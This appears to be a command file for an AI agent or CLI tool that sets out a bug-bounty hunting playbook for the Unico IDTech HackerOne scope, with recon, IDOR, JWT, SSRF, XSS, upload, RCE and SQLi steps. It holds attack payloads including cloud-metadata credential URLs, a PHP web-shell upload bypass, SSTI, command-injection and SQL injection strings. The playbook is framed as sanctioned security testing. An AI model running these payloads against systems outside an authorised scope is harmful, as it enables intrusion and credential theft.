---
description: Hunt web vulnerabilities on the Unico IDTech scope (sdk-h1.unico.io). Pre-configured with program headers, scope restrictions, and accepted vulnerability classes. Usage: /unico-hunt [--vuln-class xss|sqli|ssrf|idor|jwt|upload|rce|all]
---

# /unico-hunt

Web vulnerability hunting on the **Unico IDTech** scope.

**Target**: `sdk-h1.unico.io`
**Platform**: HackerOne
**Rewards**: Low $150 / Medium $500 / High $1,250–$1,750 / Critical $3,000–$5,000

## Usage

```
/unico-hunt                      → full hunt on sdk-h1.unico.io
/unico-hunt --vuln-class idor    → focus on IDOR
/unico-hunt --vuln-class ssrf    → focus on SSRF
/unico-hunt --vuln-class jwt     → focus on JWT token vulnerabilities
/unico-hunt --vuln-class upload  → focus on file upload
/unico-hunt --vuln-class xss     → focus on XSS
```

## STOP: Mandatory Pre-Hunt Checks

**Before the first request**, verify:
- [ ] Target is `sdk-h1.unico.io` (only in-scope domain)
- [ ] All requests include `X-HackerOne-Research: YOUR_H1_USERNAME`
- [ ] All requests include `User-Agent: YOUR_H1_USERNAME`
- [ ] Finding is NOT in the Unico out-of-scope list (see below)

## Phase 1: Recon (10 min)

```bash
TARGET="sdk-h1.unico.io"

# Tech stack detection
curl -sI "https://$TARGET" | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator|content-type"

# Sitemap / robots
curl -s "https://$TARGET/robots.txt"
curl -s "https://$TARGET/sitemap.xml"

# JS files enumeration (for endpoints, tokens, secrets)
curl -s "https://$TARGET" | grep -oP 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//'

# API endpoint discovery via ffuf
ffuf -u "https://$TARGET/FUZZ" \
  -w wordlists/api-endpoints.txt \
  -H "X-HackerOne-Research: YOUR_H1_USERNAME" \
  -H "User-Agent: YOUR_H1_USERNAME" \
  -mc 200,201,204,301,302,401,403 \
  -o recon/unico/ffuf_root.json

# Subdirectory discovery
ffuf -u "https://$TARGET/FUZZ" \
  -w wordlists/raft-medium-dirs.txt \
  -H "X-HackerOne-Research: YOUR_H1_USERNAME" \
  -mc 200,201,204,301,302 \
  -o recon/unico/ffuf_dirs.json
```

## Phase 2: Priority Bug Classes for Unico Web

Based on program acceptance criteria — focus in this order:

### 1. IDOR (highest ROI — avg $500 medium, $1,750 high)
```bash
# Create two test accounts: ATTACKER and VICTIM
# Perform actions as VICTIM, note all IDs in responses
# Replay as ATTACKER with victim's IDs

# Common Unico endpoints to test:
# /api/*/captures/{id}
# /api/*/sessions/{id}
# /api/*/results/{id}
# /api/*/users/{id}
# /api/*/transactions/{id}

# HTTP method variation test:
for METHOD in GET POST PUT PATCH DELETE; do
  curl -s -o /dev/null -w "$METHOD /api/captures/VICTIM_ID → %{http_code}\n" \
    -X $METHOD "https://$TARGET/api/captures/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "X-HackerOne-Research: YOUR_H1_USERNAME"
done

# API version downgrade test:
# /api/v2/captures/ID → 403?
# /api/v1/captures/ID → 200? (older version may lack auth)
```

### 2. JWT Token Vulnerabilities
```bash
# Capture your JWT from auth flow
TOKEN="YOUR_JWT_HERE"

# Decode JWT (header.payload.signature)
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null

# Test: algorithm confusion (RS256 → HS256)
# Use the server's public key as HMAC secret
# Forge a token with {"alg":"HS256"} in header

# Test: "none" algorithm
# Replace signature with empty string: header.payload.
# {"alg":"none","typ":"JWT"}

# Test: expired token still accepted?
# Use an old/expired token — does server reject it?

# Test: JWT kid/jku injection
# Modify "kid" to point to your server
# Modify "jku" to point to your JWKS
```

### 3. SSRF
```bash
# Find URL-like parameters in app
# Look in: webhooks, image URLs, document URLs, API callback endpoints

# OOB test with interactsh
interactsh-client &
INTERACT="YOUR_INTERACTSH_URL"

# Test each URL parameter:
curl "https://$TARGET/api/process?url=$INTERACT" \
  -H "X-HackerOne-Research: YOUR_H1_USERNAME"

# If OOB confirmed → escalate to internal:
# AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP metadata: http://metadata.google.internal/computeMetadata/v1/instance/
```

### 4. XSS (must show real impact — alert alone = low priority)
```bash
# Stored XSS: find input fields that render elsewhere
# Test profile fields, names, descriptions, file names

# Reflected XSS: test URL parameters
# curl "https://$TARGET/search?q=<script>alert(1)</script>"

# Useful if: admin sees the XSS (privilege escalation), or cookie theft possible
# Self-XSS = NOT reportable for Unico

# DOM XSS — must demonstrate clear impact (cookie theft, redirect to malicious)
# DOM XSS without impact = NOT reportable per Unico scope
```

### 5. Unrestricted File Upload
```bash
# Find file upload endpoints (profile photos, documents, etc.)
# Test bypass techniques:

# Extension bypass:
# shell.php → shell.php.jpg → shell.phtml → shell.php%00.jpg

# Content-Type bypass:
curl -X POST "https://$TARGET/api/upload" \
  -H "Content-Type: multipart/form-data" \
  -H "X-HackerOne-Research: YOUR_H1_USERNAME" \
  -F "file=@shell.php;type=image/jpeg;filename=shell.jpg"

# Magic bytes bypass:
# Prepend GIF89a; to a PHP shell → submit as .gif

# Goal: upload executable file + access it via URL = RCE = Critical ($3,000-$5,000)
```

### 6. RCE
```bash
# Look for: template rendering endpoints, file processing, deserialization
# Test SSTI in any field that renders user input:
# {{7*7}} → 49? → Jinja2/Twig → escalate to RCE

# Command injection in filenames, parameters that pass to system():
# ; id ; → whoami → echo test > /tmp/rce.txt
# Run harmless commands only: id, whoami, uname -a, cat /etc/hostname
```

### 7. SQLi
```bash
# Test login forms, search fields, ID parameters
# Error-based: add ' and observe SQL error in response
curl "https://$TARGET/api/users?id=1'" \
  -H "X-HackerOne-Research: YOUR_H1_USERNAME"

# Time-based blind (if no errors):
# MySQL: 1 AND SLEEP(5)
# PostgreSQL: 1;SELECT pg_sleep(5)--
# SQLite: 1 AND (SELECT count(*) FROM sqlite_master WHERE type='table' AND name LIKE 'a'||hex(randomblob(50000000)))>0

# Report as soon as you see SQL error or confirm version disclosure
```

## Phase 3: A→B Signal — Unico-Specific Chains

| Found A | Check B | Check C |
|---|---|---|
| IDOR on capture result | IDOR on transaction | Read liveness result of another user |
| Auth bypass on endpoint | Sibling endpoints in same API group | Old API version without auth |
| JWT forged | Access admin-only endpoints | Escalate to account takeover |
| SSRF OOB | Cloud metadata credentials | Internal API access |
| File upload to web root | Execute uploaded file | RCE chain |

## Phase 4: Document Finding

Create `targets/unico-idtech/SESSION.md` (update as you hunt):

```markdown
# UNICO HUNT | Date: [today] | Crown Jewel: [what attacker wants most]

## Active Leads
- [HH:MM] /api/v1/captures/{id} — testing IDOR...
- [HH:MM] JWT "alg:none" — checking if rejected...

## Dead Ends
- /admin → 403 blocked

## Confirmed Bugs
- [HH:MM] IDOR on /api/captures/{id} — attacker reads victim capture results
  - Transaction ID: [if liveness-related]
  - Severity: Medium ($500 avg)
```

## Out-of-Scope — DO NOT REPORT for Unico

These will be closed immediately:
- Clickjacking (even with sensitive actions, unless chained with real impact)
- CSRF on any form (explicitly excluded)
- Missing headers (HSTS, CSP, X-Frame-Options, etc.)
- Missing HttpOnly/Secure cookie flags
- SSL/TLS configuration issues
- SPF/DKIM/DMARC issues
- Self-XSS
- DOM XSS without clear impact (explicitly excluded)
- Open redirect (unless chained to demonstrate real impact)
- Rate limiting on non-authenticated endpoints
- DoS / availability issues
- Content spoofing without HTML/CSS modification
- Subdomain takeover
- Version disclosure / banner grabbing
- CSV injection without demonstrated impact
- Expired credentials that don't provide access
- MITM attacks
- Attacks requiring unlikely user interaction
- Vulnerabilities in wrapper app (only SDK engine is in scope)

## Stop Signals

- 403 on every variation of an endpoint
- 20+ payload variations, identical responses
- Finding requires 5+ simultaneous conditions
- 30+ min on same endpoint with zero progress
- Finding is in the out-of-scope list above
